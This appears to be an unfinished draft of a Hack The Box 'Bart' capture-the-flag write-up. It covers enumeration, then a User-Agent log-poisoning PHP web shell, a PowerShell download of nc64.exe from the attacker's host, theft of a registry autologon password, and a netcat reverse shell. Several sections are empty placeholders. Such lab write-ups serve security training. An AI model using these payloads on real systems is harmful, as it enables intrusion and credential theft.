---
layout: post
title:  "Hack The Box - Bart - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSCP"]
---
{% assign imgDir="HTB-Bart-Writeup" %}

# Introduction
The hack the box machine "Bart" is a medium machine which is included in [TJnull's OSCP Preparation List](). Exploiting this machine requires knowledge in the areas of wordlist generation, log injection. This machine differs from other machines in the sense that is quite realistic.

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">

By enumerating the target, it is possible to discover 

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.81`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that there is only 

{% highlight none linenos %}
┌──(kali㉿kali)-[~]
└─$ @@sudo nmap -sS -sC -sV -p- 10.10.10.81@@
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-04 09:22 EDT
Nmap scan report for 10.10.10.81
Host is up (0.037s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
@@@80/tcp open  http@@@    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://forum.bart.htb/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.97 seconds
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ 
{% endhighlight %}

If we try to navigate to [http://10.10.10.81](http://10.10.10.81) in a browser, we are redirected [http://forum.bart.htb](http://forum.bart.htb). However, our browser won't be able to find a host for this domain since it can not find any related DNS record which resolve to an IP address. 

![forum.bart.htb](/assets/{{ imgDir }}/forum.bart.htb.png)

We can add the domain name `forum.bart.htb` to our `/etc/hosts` file and try again. 

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ echo '10.10.10.81\tforum.bart.htb\tbart.htb' | sudo tee -a /etc/hosts 
10.10.10.81     forum.bart.htb  bart.htb
                                                                                                                                                            
┌──(kali㉿kali)-[/tmp/x]
└─$
{% endhighlight %}

ffuf -u http://bart.htb/FUZZ -ic -fs 158607 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt 
We use -fs to filter out 404 pages

We find /monitor

we log in to /monitor with harvey:potter

a redirect is performed to monitor.bart.htb

We add monitor.bart.htb to our `/etc/hosts` file and reload the page

We log in again

Click "Servers" page => We find internal-01.bart.htb

Visiting the URL http://internal-01.bart.htb leads to a redirection to http://internal-01.bart.htb/simple_chat/login_form.php

googling "simple_chat" leads us to https://github.com/magkopian/php-ajax-simple-chat

POST /simple_chat/register.php HTTP/1.1
Host: internal-01.bart.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

uname=test&passwd=Testing123!

GET /log/log.php?filename=ws.php&username=harvey HTTP/1.1
Host: internal-01.bart.htb
User-Agent: <?php system($_GET['c']); ?>
Accept: */*
Referer: http://internal-01.bart.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=abglkpe7dbegm7s866jb7k17s5
Connection: close

GET /log/ws.php?c=whoami HTTP/1.1
Host: internal-01.bart.htb
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Referer: http://internal-01.bart.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

We use n64.exe from.
https://eternallybored.org/misc/netcat/

sudo python3 -m http.server 80

powershell "wget http://10.10.16.2/nc64.exe -OutFile nc64.exe"

GET /log/ws.php?c=%70%6f%77%65%72%73%68%65%6c%6c%20%22%77%67%65%74%20%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%36%2e%32%2f%6e%63%36%34%2e%65%78%65%20%2d%4f%75%74%46%69%6c%65%20%6e%63%36%34%2e%65%78%65%22


PS C:\inetpub\wwwroot\internal-01\log> Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"

DefaultDomainName DefaultUserName DefaultPassword                 
----------------- --------------- ---------------                 
DESKTOP-7I3S68E   Administrator   3130438f31186fbaf962f407711faddb

 Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Name, Domain

Gives us "BART"

$secstr = New-Object -TypeName System.Security.SecureString
"3130438f31186fbaf962f407711faddb".ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$creds = new-object -typename System.Management.Automation.PSCredential -argumentlist "BART\Administrator", $secstr
Invoke-Command -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc64.exe -e powershell.exe 10.10.16.2 443 } -Credential $creds -Computer localhost

{% highlight none linenos %}
Placeholder
{% endhighlight %}

{% highlight none linenos %}
Placeholder
{% endhighlight %}

{% highlight none linenos %}
Placeholder
{% endhighlight %}

{% highlight none linenos %}
Placeholder
{% endhighlight %}

{% highlight none linenos %}
Placeholder
{% endhighlight %}

{% highlight none linenos %}
Placeholder
{% endhighlight %}

{% highlight none linenos %}
Placeholder
{% endhighlight %}

{% highlight none linenos %}
Placeholder
{% endhighlight %}



# Privilege Escalation

